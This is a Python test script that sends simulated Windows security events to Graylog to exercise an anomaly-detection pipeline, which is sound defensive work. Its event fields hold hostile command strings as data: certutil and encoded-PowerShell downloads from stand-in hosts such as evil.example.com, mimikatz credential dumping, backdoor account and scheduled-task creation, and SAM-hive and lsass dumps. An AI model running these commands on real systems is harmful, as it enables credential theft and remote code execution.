"""
simulate_anomalies.py — Anomaly Simulator
==========================================
Sends events to Graylog via GELF HTTP that are specifically designed to
trigger all three detection layers in the anomaly engine:

  Layer 1 — Deterministic rules (brute force, privilege escalation,
             LOLBins, off-hours, rapid account manipulation)
  Layer 2 — Isolation Forest behavioral drift (unusual users, IPs,
             commands, and timing that deviate from the trained baseline)
  Layer 3 — Threat Intel IOC match (known-malicious IPs and file hashes
             present in the threat_intel table)

Each scenario is independent and labelled. Run all or pass --scenario
to target one specifically.

Run:
    python simulate_anomalies.py [--scenario brute_force] [--dry-run]

Scenarios:
    brute_force          5+ 4625 failures from same IP within 5 minutes  → L1
    privilege_escalation 4672 event from a non-admin account              → L1
    lolbin               certutil / mshta / powershell -enc in CommandLine→ L1
    off_hours            any event timestamped 20:00–06:00 EAT            → L1
    rapid_account        account created then deleted in quick succession  → L1
    new_user_lateral     unknown username logging in from external IP      → L2
    rare_command         unusual CommandLine never seen in training        → L2
    odd_time_burst       known user authenticating at 03:00 repeatedly    → L2
    ioc_ip_match         event IpAddress matches a known-malicious IP     → L3
    ioc_hash_match       event file hash matches a known IOC hash         → L3
    combined             one event that hits L1 + L2 + L3 simultaneously  → all

Environment variables (same .env as the platform):
    GRAYLOG_BASE_URL         e.g. http://localhost:9000
    GRAYLOG_GELF_HTTP_PORT   12201
    THREAT_INTEL_IOC_IP      a real IP from your threat_intel.iocs column
    THREAT_INTEL_IOC_HASH    a real hash from your threat_intel.iocs column
"""

import argparse
import asyncio
import json
import logging
import os
import random
import sys
import time
from datetime import datetime, timedelta, timezone

import httpx
from dotenv import load_dotenv

load_dotenv()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
log = logging.getLogger("simulate_anomalies")

# ── Config ────────────────────────────────────────────────────────────────────
GRAYLOG_BASE_URL = os.getenv("GRAYLOG_BASE_URL", "http://localhost:9000")
GELF_HTTP_PORT   = int(os.getenv("GRAYLOG_GELF_HTTP_PORT", "12201"))
GELF_URL = (
    f"http://{GRAYLOG_BASE_URL.replace('http://','').replace('https://','').split(':')[0]}"
    f":{GELF_HTTP_PORT}/gelf"
)

# ── IOC values ─────────────────────────────────────────────────────────────────
# Replace these with real values present in your threat_intel table.
# The anomaly engine's check_threat_intel() compares against IpAddress,
# SourceIp, DestinationIp, Hashes, FileHash fields.
MALICIOUS_IP   = os.getenv("THREAT_INTEL_IOC_IP",   "203.0.113.45")   # from OTX example
MALICIOUS_HASH = os.getenv("THREAT_INTEL_IOC_HASH",  "d41d8cd98f00b204e9800998ecf8427e")

# ── Helpers ───────────────────────────────────────────────────────────────────

def _now_ts() -> float:
    """Current epoch seconds for a fresh Graylog message."""
    return datetime.now(timezone.utc).timestamp()


def _offset_ts(minutes: int = 0, seconds: int = 0) -> float:
    """Epoch seconds offset from now (negative = in the past)."""
    delta = timedelta(minutes=minutes, seconds=seconds)
    return (datetime.now(timezone.utc) + delta).timestamp()


def _off_hours_ts() -> float:
    """
    Returns an epoch timestamp for tonight at 02:00 EAT (UTC+3).
    If it's already past midnight, uses yesterday's 02:00.
    This guarantees the hour falls in OFF_HOURS_END(7) range,
    triggering the off-hours rule regardless of when the script runs.
    """
    import pytz
    EAT = pytz.timezone("Africa/Nairobi")
    now_eat = datetime.now(EAT)
    # Build 02:00 today in EAT
    target = now_eat.replace(hour=2, minute=15, second=0, microsecond=0)
    # If 02:00 hasn't happened yet today keep it, otherwise use tomorrow
    if target > now_eat:
        pass
    else:
        target = target + timedelta(days=1)
    return target.astimezone(timezone.utc).timestamp()


def _base_msg(host: str = "dc01.corp.local") -> dict:
    return {
        "version":       "1.1",
        "host":          host,
        "short_message": "simulation event",
        "level":         6,
        "_simulate":     "anomaly",
    }


# ── Scenario builders ─────────────────────────────────────────────────────────
# Each returns a list of GELF dicts. The log collector picks them all up on
# its next cycle, and the anomaly engine evaluates the whole batch together —
# which is critical for aggregation rules like brute force.


def scenario_brute_force() -> list[dict]:
    """
    6 failed logins (4625) from the same source IP within 2 minutes.
    Triggers: L1 BruteForce rule (threshold ≥ 5 failures / 5 min / same IP).
    Also triggers L2 because multiple rapid failures from one IP is
    statistically anomalous vs a baseline of 99% successes.
    """
    ip = "198.51.100.77"   # external, not in any user profile
    msgs = []
    for i in range(6):
        m = _base_msg()
        m.update({
            "short_message": f"Failed login attempt {i+1} from {ip}",
            "timestamp":     _offset_ts(minutes=-4, seconds=i * 20),  # all within 4 min
            "EventID":       "4625",
            "TargetUserName": "administrator",
            "IpAddress":     ip,
            "LogonType":     "3",
            "FailureReason": "%%2313",
        })
        msgs.append(m)
    log.info("[brute_force] prepared %d events (IP=%s)", len(msgs), ip)
    return msgs


def scenario_privilege_escalation() -> list[dict]:
    """
    4672 (Special Privileges Assigned) for a regular non-admin user.
    Triggers: L1 PrivilegeEscalation rule.
    Triggers: L2 because regular users never appear with EventID 4672
              in the training baseline.
    """
    m = _base_msg()
    m.update({
        "short_message": "Privilege escalation — regular user received special privileges",
        "timestamp":     _now_ts(),
        "EventID":       "4672",
        "TargetUserName": "joshua",       # a known regular user, not an admin
        "IpAddress":     "192.168.56.104",
        "SubjectUserName": "joshua",
    })
    log.info("[privilege_escalation] prepared 1 event")
    return [m]


def scenario_lolbin() -> list[dict]:
    """
    Three separate LOLBin commands — certutil download, encoded PowerShell,
    and mshta — each from a different user to spread the signal.
    Triggers: L1 SuspiciousProcess rules for each pattern.
    Triggers: L2 because these CommandLine values have frequency ≈ 0 in training.
    """
    commands = [
        ("joshua",   "certutil -urlcache -split -f http://evil.example.com/payload.exe C:\\Windows\\Temp\\payload.exe"),
        ("yvonne",   "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHMAaABlAGwAbAAnACkA"),
        ("vincent",  "mshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"cmd /c whoami > C:\\\\temp\\\\out.txt\"\"\")(window.close)\")"),
    ]
    msgs = []
    for user, cmd in commands:
        m = _base_msg(host=f"ws-{random.randint(1,10):02d}.corp.local")
        m.update({
            "short_message":  f"LOLBin process by {user}",
            "timestamp":      _offset_ts(minutes=-random.randint(1, 10)),
            "EventID":        "4688",
            "SubjectUserName": user,
            "CommandLine":    cmd,
            "NewProcessName": cmd.split()[0],
        })
        msgs.append(m)
    log.info("[lolbin] prepared %d events", len(msgs))
    return msgs


def scenario_off_hours() -> list[dict]:
    """
    Authentication and process events timestamped at 02:15 EAT.
    Triggers: L1 OffHoursActivity rule (outside 07:00–19:00 EAT).
    Triggers: L2 because Hour=2 is a rare feature value in the training
              baseline where work happens between 07:00–18:00.
    NOTE: Graylog stores the timestamp as sent. The log collector normalizes
    to EAT. The off-hours rule in evaluate_default_rules() checks ts_eat.hour.
    """
    ts = _off_hours_ts()
    msgs = []

    # Off-hours login
    m1 = _base_msg()
    m1.update({
        "short_message": "Off-hours authentication at 02:15 EAT",
        "timestamp":     ts,
        "EventID":       "4624",
        "TargetUserName": "vincent",
        "IpAddress":     "10.0.2.15",
        "LogonType":     "10",   # RemoteInteractive — more suspicious at night
    })

    # Off-hours process launch (cmd.exe, which is mildly unusual at 2am)
    m2 = _base_msg(host="ws-05.corp.local")
    m2.update({
        "short_message": "Off-hours process launch at 02:15 EAT",
        "timestamp":     ts + 45,
        "EventID":       "4688",
        "SubjectUserName": "vincent",
        "CommandLine":   "cmd.exe /c ipconfig /all",
        "NewProcessName": "cmd.exe",
    })

    msgs = [m1, m2]
    log.info("[off_hours] prepared %d events (EAT 02:15)", len(msgs))
    return msgs


def scenario_rapid_account() -> list[dict]:
    """
    Account created (4720) then immediately deleted (4726) within 90 seconds.
    Triggers: L1 if a RapidAccountManipulation rule is defined
              (creation + deletion in short window from same subject).
    Triggers: L2 because 4726 (account deletion) is extremely rare in the
              training baseline and the SubjectUserName is a regular user,
              not Administrator or SYSTEM.
    """
    subject = "alice"   # regular user — shouldn't be doing this
    target  = f"tmp_svc_{random.randint(1000,9999)}"
    now     = _now_ts()

    m_create = _base_msg()
    m_create.update({
        "short_message":  f"Account created: {target} by {subject}",
        "timestamp":      now,
        "EventID":        "4720",
        "SubjectUserName": subject,
        "TargetUserName": target,
        "SamAccountName": target,
    })

    m_delete = _base_msg()
    m_delete.update({
        "short_message":  f"Account deleted: {target} by {subject}",
        "timestamp":      now + 90,    # 90 seconds later
        "EventID":        "4726",
        "SubjectUserName": subject,
        "TargetUserName": target,
        "SamAccountName": target,
    })

    log.info("[rapid_account] prepared 2 events (create+delete of %s)", target)
    return [m_create, m_delete]


def scenario_new_user_lateral() -> list[dict]:
    """
    A username the Isolation Forest has never seen authenticates successfully
    from an external IP not in any user profile.
    Triggers: L2 — both TargetUserName_Freq ≈ 0 and IpAddress_Freq ≈ 0,
              producing an anomaly score well below threshold.
    No L1 rule fires because it is a single successful login (4624).
    This is the purest L2-only signal.
    """
    msgs = []
    for i in range(4):   # a small cluster makes the IF score more reliable
        m = _base_msg()
        m.update({
            "short_message": "Unknown user authenticated from external IP",
            "timestamp":     _offset_ts(minutes=-i * 3),
            "EventID":       "4624",
            "TargetUserName": "newcontractor99",   # never in training data
            "IpAddress":     "41.90.64.200",       # external Nairobi IP, not internal
            "LogonType":     "3",
        })
        msgs.append(m)
    log.info("[new_user_lateral] prepared %d events", len(msgs))
    return msgs


def scenario_rare_command() -> list[dict]:
    """
    Process commands that were never (or extremely rarely) seen during training:
    mimikatz invocation, net user /add for a new admin, and whoami piped to HTTP.
    TargetUserName_Freq ≈ 0 for these CommandLine values.
    Triggers: L2 — CommandLine_Freq ≈ 0 drives the IF score low.
    Also triggers: L1 SuspiciousProcess for mimikatz and net user patterns.
    """
    rare_cmds = [
        ("testuser",  "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\""),
        ("bob",       "net user hacker P@ssw0rd123! /add"),
        ("alice",     "powershell -e aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAnACkA"),
        ("vincent",   "wmic process call create \"cmd /c powershell -enc abc123\""),
    ]
    msgs = []
    for user, cmd in rare_cmds:
        m = _base_msg(host=f"ws-{random.randint(1,10):02d}.corp.local")
        m.update({
            "short_message":  f"Rare/suspicious command by {user}",
            "timestamp":      _offset_ts(minutes=-random.randint(1, 15)),
            "EventID":        "4688",
            "SubjectUserName": user,
            "CommandLine":    cmd,
            "NewProcessName": cmd.split()[0],
        })
        msgs.append(m)
    log.info("[rare_command] prepared %d events", len(msgs))
    return msgs


def scenario_odd_time_burst() -> list[dict]:
    """
    Known user 'joshua' authenticates 8 times between 03:00–03:30 EAT.
    His training profile shows zero activity before 07:00.
    Triggers: L1 OffHoursActivity (hour < 7).
    Triggers: L2 — Hour feature = 3, IsWeekend context, and the burst
              volume are all out-of-distribution for this user's baseline.
    """
    import pytz
    EAT = pytz.timezone("Africa/Nairobi")
    now_eat = datetime.now(EAT)
    # Set to 03:05 EAT today (or tomorrow if we've passed it)
    target = now_eat.replace(hour=3, minute=5, second=0, microsecond=0)
    if target <= now_eat:
        target += timedelta(days=1)

    msgs = []
    for i in range(8):
        ts_utc = (target + timedelta(minutes=i * 4)).astimezone(timezone.utc)
        m = _base_msg()
        m.update({
            "short_message": f"joshua auth burst at 03:0{i*4} EAT",
            "timestamp":     ts_utc.timestamp(),
            "EventID":       "4624",
            "TargetUserName": "joshua",
            "IpAddress":     "192.168.56.104",   # his known IP — L1 won't fire on IP
            "LogonType":     "3",
        })
        msgs.append(m)
    log.info("[odd_time_burst] prepared %d events (EAT ~03:00)", len(msgs))
    return msgs


def scenario_ioc_ip_match() -> list[dict]:
    """
    Authentication event where IpAddress = a known-malicious IP from
    the threat_intel table.
    Triggers: L3 ThreatIntelMatch.
    May also trigger L2 because the IP frequency in training ≈ 0.

    Set THREAT_INTEL_IOC_IP in your .env to a real value from:
        SELECT jsonb_array_elements_text(iocs->'ips') FROM threat_intel LIMIT 5;
    """
    m = _base_msg()
    m.update({
        "short_message": f"Auth from known-malicious IP {MALICIOUS_IP}",
        "timestamp":     _now_ts(),
        "EventID":       "4624",
        "TargetUserName": "svc_backup",
        "IpAddress":     MALICIOUS_IP,   # matched by check_threat_intel()
        "SourceIp":      MALICIOUS_IP,
        "LogonType":     "3",
    })
    log.info("[ioc_ip_match] prepared 1 event (IP=%s)", MALICIOUS_IP)
    return [m]


def scenario_ioc_hash_match() -> list[dict]:
    """
    Process creation event where the Hashes field contains a known-malicious
    file hash from the threat_intel table.
    Triggers: L3 ThreatIntelMatch.
    Triggers: L2 because CommandLine frequency ≈ 0 and the hash itself
              marks the file as a rare/unseen executable.

    Set THREAT_INTEL_IOC_HASH in your .env to a real value from:
        SELECT jsonb_array_elements_text(iocs->'hashes') FROM threat_intel LIMIT 5;
    """
    m = _base_msg(host="ws-07.corp.local")
    m.update({
        "short_message": f"Process with known-malicious hash {MALICIOUS_HASH[:16]}...",
        "timestamp":     _now_ts(),
        "EventID":       "4688",
        "SubjectUserName": "testuser",
        "CommandLine":   "svchost32.exe -k netsvcs",   # looks like svchost but isn't
        "NewProcessName": "C:\\Users\\testuser\\AppData\\Local\\Temp\\svchost32.exe",
        "Hashes":        f"MD5={MALICIOUS_HASH}",      # checked by check_threat_intel()
        "FileHash":      MALICIOUS_HASH,
    })
    log.info("[ioc_hash_match] prepared 1 event (hash=%s...)", MALICIOUS_HASH[:16])
    return [m]


def scenario_combined() -> list[dict]:
    """
    A single event crafted to hit all three layers:
      L1 — LOLBin pattern (certutil) + off-hours timestamp
      L2 — Unknown user, zero-freq CommandLine, unusual hour
      L3 — IpAddress matches a known malicious IP
    This is the worst-case event: a real attacker using a known-bad C2,
    living off the land, at 02:00 in the morning under a new account.
    """
    ts = _off_hours_ts()
    m = _base_msg(host="ws-99.corp.local")
    m.update({
        "short_message": "COMBINED: LOLBin + off-hours + unknown user + malicious IP",
        "timestamp":     ts,
        "EventID":       "4688",
        "SubjectUserName": "newcontractor99",     # L2: zero freq
        "CommandLine":   f"certutil -urlcache -split -f http://{MALICIOUS_IP}/stager.exe stager.exe",
        "NewProcessName": "certutil.exe",
        "IpAddress":     MALICIOUS_IP,            # L3: IOC match
        "SourceIp":      MALICIOUS_IP,
        "Hashes":        f"MD5={MALICIOUS_HASH}",
        "FileHash":      MALICIOUS_HASH,
    })
    log.info("[combined] prepared 1 event targeting all 3 layers")
    return [m]


# ── Registry ──────────────────────────────────────────────────────────────────

SCENARIOS: dict[str, callable] = {
    "brute_force":          scenario_brute_force,
    "privilege_escalation": scenario_privilege_escalation,
    "lolbin":               scenario_lolbin,
    "off_hours":            scenario_off_hours,
    "rapid_account":        scenario_rapid_account,
    "new_user_lateral":     scenario_new_user_lateral,
    "rare_command":         scenario_rare_command,
    "odd_time_burst":       scenario_odd_time_burst,
    "ioc_ip_match":         scenario_ioc_ip_match,
    "ioc_hash_match":       scenario_ioc_hash_match,
    "combined":             scenario_combined,
}


# ── Sender ────────────────────────────────────────────────────────────────────

async def send_gelf(client: httpx.AsyncClient, message: dict, dry_run: bool = False) -> bool:
    if dry_run:
        log.info(
            "[DRY-RUN] EventID=%-4s user=%-20s cmd_or_ip=%s",
            message.get("EventID", "?"),
            message.get("TargetUserName") or message.get("SubjectUserName", "?"),
            (message.get("CommandLine") or message.get("IpAddress", ""))[:60],
        )
        return True
    try:
        r = await client.post(
            GELF_URL,
            content=json.dumps(message).encode(),
            headers={"Content-Type": "application/json"},
            timeout=10,
        )
        r.raise_for_status()
        return True
    except httpx.HTTPStatusError as e:
        log.warning("GELF HTTP %s: %s", e.response.status_code, str(message)[:80])
        return False
    except httpx.RequestError as e:
        log.error("GELF connection error: %s — is Graylog running at %s?", e, GELF_URL)
        return False


# ── Main ──────────────────────────────────────────────────────────────────────

async def run(scenario_names: list[str], dry_run: bool):
    log.info(
        "simulate_anomalies starting: scenarios=%s dry_run=%s gelf_url=%s",
        scenario_names, dry_run, GELF_URL,
    )
    log.info(
        "IOC config: MALICIOUS_IP=%s  MALICIOUS_HASH=%s...",
        MALICIOUS_IP, MALICIOUS_HASH[:16],
    )

    all_messages = []
    for name in scenario_names:
        fn = SCENARIOS[name]
        msgs = fn()
        for m in msgs:
            m["_scenario"] = name   # tag for analyst search in Graylog
        all_messages.extend(msgs)

    log.info("Total messages to send: %d", len(all_messages))

    sent = 0
    failed = 0
    start = time.monotonic()

    async with httpx.AsyncClient() as http:
        for msg in all_messages:
            ok = await send_gelf(http, msg, dry_run)
            if ok:
                sent += 1
            else:
                failed += 1
            # Small delay so Graylog doesn't reorder timestamps
            await asyncio.sleep(0.05)

    duration = time.monotonic() - start
    log.info("Done. sent=%d failed=%d duration=%.1fs", sent, failed, duration)

    if not dry_run and sent > 0:
        log.info(
            "\nNext steps:\n"
            "  1. Wait up to 3 minutes for the log_collector to fetch these events.\n"
            "  2. Wait up to 5 minutes for the anomaly_engine to process them.\n"
            "  3. Check the anomalies table or analyst dashboard.\n"
            "  4. For IOC scenarios, verify your THREAT_INTEL_IOC_IP / HASH values\n"
            "     are actually present in threat_intel.iocs:\n"
            "       SELECT url, iocs FROM threat_intel WHERE iocs::text LIKE '%%%s%%' LIMIT 3;\n"
            "       SELECT url, iocs FROM threat_intel WHERE iocs::text LIKE '%%%s%%' LIMIT 3;",
            MALICIOUS_IP, MALICIOUS_HASH[:8],
        )


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Inject anomaly events into Graylog")
    parser.add_argument(
        "--scenario",
        nargs="+",
        choices=list(SCENARIOS.keys()) + ["all"],
        default=["all"],
        help="Which scenario(s) to run. Default: all",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Print events without sending to Graylog",
    )
    args = parser.parse_args()

    names = list(SCENARIOS.keys()) if "all" in args.scenario else args.scenario
    asyncio.run(run(names, args.dry_run))

# import socket
# import json
# import random
# from datetime import datetime, timedelta

# GRAYLOG_IP = "127.0.0.1"
# GRAYLOG_PORT = 12201
# BASE_DATE = datetime(2026, 3, 9, 0, 0, 0)  # Monday — matches syn.py BASE_DATE

# # =========================================================
# # syn.py CONSTANTS — reproduced so anomalies are clearly
# # outside what the model was trained on
# # =========================================================
# USER_PROFILES = {
#     "joshua":   {"home_ip": "192.168.56.104", "work_start": 8, "fav_app": "chrome.exe"},
#     "yvonne":   {"home_ip": "192.168.1.10",   "work_start": 7, "fav_app": "msedge.exe"},
#     "vincent":  {"home_ip": "10.0.2.15",      "work_start": 9, "fav_app": "WINWORD.EXE"},
#     "testuser": {"home_ip": "192.168.56.1",   "work_start": 8, "fav_app": "powershell.exe"}
# }
# REGULAR_USERS  = list(USER_PROFILES.keys())
# INTERNAL_IPS   = ["192.168.56.104", "192.168.1.10", "10.0.2.15", "192.168.56.1", "127.0.0.1"]
# ADMIN_ACCOUNTS = ["Administrator", "SYSTEM"]

# SUSPICIOUS_COMMANDS = [
#     "mimikatz.exe",
#     "whoami.exe",
#     "net.exe user /add",
#     "net.exe localgroup administrators /add",
#     "procdump.exe lsass",
#     "reg.exe save HKLM\\SAM sam.hive",
#     "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
#     "wscript.exe payload.vbs",
#     "rundll32.exe shell32.dll,ShellExec_RunDLL cmd.exe",
#     "schtasks.exe /create /tn backdoor /tr cmd.exe /sc onlogon",
#     "powershell.exe -EncodedCommand ZQBj...",
#     "mshta.exe http://evil.com/payload.hta",
# ]

# # =========================================================
# # EventID coverage map (all IDs present in fetch query)
# # =========================================================
# # AuthenticationEvents:    4624, 4625, 4634, 4648, 4672
# # AccountManagementEvents: 4720, 4722, 4723, 4724, 4725, 4726,
# #                          4728, 4729, 4732, 4733, 4740, 4781
# # ProcessCreationEvents:   4688, 4689

# # =========================================================
# # HELPERS
# # =========================================================
# def send_to_graylog(message):
#     try:
#         if "short_message" not in message:
#             message["short_message"] = f"Anomaly Alert: {message.get('_scenario', 'Unknown')}"
#         payload = json.dumps(message) + "\0"
#         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
#             sock.settimeout(3)
#             sock.connect((GRAYLOG_IP, GRAYLOG_PORT))
#             sock.sendall(payload.encode("utf-8"))
#             return True
#     except Exception as e:
#         print(f"Error sending log: {e}")
#         return False

# def safe_timestamp(now, day_offset, hour, minute):
#     dt = BASE_DATE + timedelta(days=day_offset)
#     dt = dt.replace(hour=hour, minute=minute, second=random.randint(0, 59))
#     ceiling = now - timedelta(minutes=2)
#     if dt > ceiling:
#         dt = ceiling - timedelta(minutes=random.randint(1, 30))
#     return dt

# def get_safe_total_days(now):
#     safe_end = now - timedelta(days=1)
#     if BASE_DATE >= safe_end:
#         return 0
#     return (safe_end - BASE_DATE).days

# def off_hours_dt(now, day_offset):
#     return safe_timestamp(now, day_offset, random.randint(1, 4), random.randint(0, 59))

# def external_ip():
#     return f"{random.choice([194,91,185,45])}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(2,254)}"

# def sunday_offset(now):
#     """Returns a day_offset that lands on a Sunday, or None if none available."""
#     total_days = get_safe_total_days(now)
#     days_to_first_sunday = (6 - BASE_DATE.weekday()) % 7 or 7
#     offset = days_to_first_sunday
#     while offset > total_days:
#         offset -= 7
#     return offset if offset >= 0 else None

# # =========================================================
# # AUTH — anomalous event senders
# # Covers: 4624, 4625, 4634, 4648, 4672
# # =========================================================

# def send_anon_unknown_user_logon(dt):
#     """4624 — Unknown user from external IP. TargetUserName_Freq=0, IpAddress_Freq=0."""
#     send_to_graylog({
#         "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
#         "Category": "AuthenticationEvents", "EventID": 4624,
#         "TargetUserName": random.choice(["attacker_svc", "svc_backup", "admin_temp"]),
#         "IpAddress": external_ip(),
#         "_scenario": "ANOMALY_AUTH_4624_UNKNOWN_USER"
#     })

# def send_anon_known_user_ext_ip(dt, user):
#     """4624 — Known user, external IP. Breaks the 98% home-IP affinity."""
#     send_to_graylog({
#         "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
#         "Category": "AuthenticationEvents", "EventID": 4624,
#         "TargetUserName": user, "IpAddress": external_ip(),
#         "_scenario": "ANOMALY_AUTH_4624_EXT_IP"
#     })

# def send_anon_brute_force(now, day_offset, user):
#     """4625 burst → 4624 success. Multiple failures from external IP = brute force."""
#     base_dt = off_hours_dt(now, day_offset)
#     for j in range(random.randint(6, 12)):
#         fail_dt = base_dt + timedelta(seconds=j * random.randint(3, 15))
#         if fail_dt > now - timedelta(minutes=2):
#             break
#         send_to_graylog({
#             "version": "1.1", "host": "AD01", "timestamp": fail_dt.timestamp(),
#             "Category": "AuthenticationEvents", "EventID": 4625,
#             "TargetUserName": user, "IpAddress": external_ip(),
#             "_scenario": "ANOMALY_AUTH_4625_BRUTE"
#         })
#     success_dt = base_dt + timedelta(minutes=random.randint(1, 5))
#     if success_dt < now - timedelta(minutes=2):
#         send_to_graylog({
#             "version": "1.1", "host": "AD01", "timestamp": success_dt.timestamp(),
#             "Category": "AuthenticationEvents", "EventID": 4624,
#             "TargetUserName": user, "IpAddress": external_ip(),
#             "_scenario": "ANOMALY_AUTH_4624_AFTER_BRUTE"
#         })

# def send_anon_suspicious_logoff(dt):
#     """4634 — Logoff for an unknown user (the session it closes was never seen)."""
#     send_to_graylog({
#         "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
#         "Category": "AuthenticationEvents", "EventID": 4634,
#         "TargetUserName": "attacker_svc", "IpAddress": external_ip(),
#         "_scenario": "ANOMALY_AUTH_4634_UNKNOWN"
#     })

# def send_anon_explicit_cred_external(dt, user):
#     """4648 — Explicit credential use from external IP. Normal 4648 uses internal IP."""
#     send_to_graylog({
#         "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
#         "Category": "AuthenticationEvents", "EventID": 4648,
#         "TargetUserName": user, "IpAddress": external_ip(),
#         "_scenario": "ANOMALY_AUTH_4648_EXT"
#     })

# def send_anon_special_privs_unknown(dt):
#     """4672 — Special privileges for an unknown user. Unexpected privilege elevation."""
#     send_to_graylog({
#         "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
#         "Category": "AuthenticationEvents", "EventID": 4672,
#         "TargetUserName": random.choice(["attacker_svc", "ghost_admin"]),
#         "IpAddress": external_ip(),
#         "_scenario": "ANOMALY_AUTH_4672_UNKNOWN"
#     })

# def send_anon_lateral_movement(now, day_offset, user):
#     """4624 rapid-fire from multiple external IPs — lateral movement."""
#     base_dt = off_hours_dt(now, day_offset)
#     for j in range(random.randint(3, 6)):
#         hop_dt = base_dt + timedelta(minutes=j * random.randint(2, 8))
#         if hop_dt > now - timedelta(minutes=2):
#             break
#         send_to_graylog({
#             "version": "1.1", "host": f"WS{random.randint(1,5):02d}",
#             "timestamp": hop_dt.timestamp(),
#             "Category": "AuthenticationEvents", "EventID": 4624,
#             "TargetUserName": user, "IpAddress": external_ip(),
#             "_scenario": "ANOMALY_AUTH_LATERAL"
#         })

# def send_anon_sunday_auth(now):
#     """4624 on a Sunday — syn.py weight=0 for Sunday, model has zero Sunday examples."""
#     offset = sunday_offset(now)
#     if offset is None:
#         return
#     dt   = safe_timestamp(now, offset, random.randint(0, 23), random.randint(0, 59))
#     user = random.choice(REGULAR_USERS)
#     send_to_graylog({
#         "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
#         "Category": "AuthenticationEvents", "EventID": 4624,
#         "TargetUserName": user, "IpAddress": USER_PROFILES[user]["home_ip"],
#         "_scenario": "ANOMALY_AUTH_SUNDAY"
#     })

# # =========================================================
# # PROCESS — anomalous event senders
# # Covers: 4688, 4689
# # =========================================================

# def send_anon_known_user_suspicious_cmd(dt, user):
#     """4688 — Known user running attacker tooling. CommandLine_Freq=0."""
#     send_to_graylog({
#         "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
#         "Category": "ProcessCreationEvents", "EventID": 4688,
#         "SubjectUserName": user, "CommandLine": random.choice(SUSPICIOUS_COMMANDS),
#         "_scenario": "ANOMALY_PROC_4688_KNOWN_USER"
#     })

# def send_anon_unknown_user_cmd(dt):
#     """4688 — Unknown user + suspicious command. Double zero-frequency hit."""
#     send_to_graylog({
#         "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
#         "Category": "ProcessCreationEvents", "EventID": 4688,
#         "SubjectUserName": random.choice(["attacker_svc", "svc_backup"]),
#         "CommandLine": random.choice(SUSPICIOUS_COMMANDS),
#         "_scenario": "ANOMALY_PROC_4688_UNKNOWN_USER"
#     })

# def send_anon_process_exit_suspicious(dt, user):
#     """4689 — Process exit for a suspicious tool. Paired exit after anomalous 4688."""
#     send_to_graylog({
#         "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
#         "Category": "ProcessCreationEvents", "EventID": 4689,
#         "SubjectUserName": user, "CommandLine": random.choice(SUSPICIOUS_COMMANDS),
#         "_scenario": "ANOMALY_PROC_4689_SUSPICIOUS"
#     })

# def send_anon_sunday_proc(now):
#     """4688 on Sunday with suspicious command — time + command both anomalous."""
#     offset = sunday_offset(now)
#     if offset is None:
#         return
#     dt   = safe_timestamp(now, offset, random.randint(0, 23), random.randint(0, 59))
#     user = random.choice(REGULAR_USERS)
#     send_to_graylog({
#         "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
#         "Category": "ProcessCreationEvents", "EventID": 4688,
#         "SubjectUserName": user, "CommandLine": random.choice(SUSPICIOUS_COMMANDS),
#         "_scenario": "ANOMALY_PROC_SUNDAY"
#     })

# # =========================================================
# # ACCOUNT MANAGEMENT — anomalous event senders
# # Covers ALL 12 fetch EventIDs with anomalous variants:
# # 4720, 4722, 4723, 4724, 4725, 4726, 4728, 4729,
# # 4732, 4733, 4740, 4781
# # =========================================================

# def send_anon_nonadmin_creates_account(dt, i):
#     """4720 — Non-admin creating a backdoor account. SubjectUserName is a regular user."""
#     send_to_graylog({
#         "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
#         "Category": "AccountManagementEvents", "EventID": 4720,
#         "SubjectUserName": random.choice(REGULAR_USERS),   # NOT admin
#         "TargetUserName": f"backdoor_{i}",
#         "_scenario": "ANOMALY_ACCT_4720_NONADMIN"
#     })

# def send_anon_unknown_target_enabled(dt):
#     """4722 — Admin enabling an account the model has never seen."""
#     send_to_graylog({
#         "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
#         "Category": "AccountManagementEvents", "EventID": 4722,
#         "SubjectUserName": random.choice(ADMIN_ACCOUNTS),
#         "TargetUserName": f"ghost_{random.randint(100,999)}",
#         "_scenario": "ANOMALY_ACCT_4722_UNKNOWN_TARGET"
#     })

# def send_anon_nonadmin_password_change(dt, user):
#     """4723 — Non-admin changing another user's password (lateral privilege abuse)."""
#     target = random.choice([u for u in REGULAR_USERS if u != user])
#     send_to_graylog({
#         "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
#         "Category": "AccountManagementEvents", "EventID": 4723,
#         "SubjectUserName": user,    # regular user acting on another account
#         "TargetUserName": target,
#         "_scenario": "ANOMALY_ACCT_4723_NONADMIN_OTHER"
#     })

# def send_anon_nonadmin_resets_password(dt, user):
#     """4724 — Non-admin resetting another user's password."""
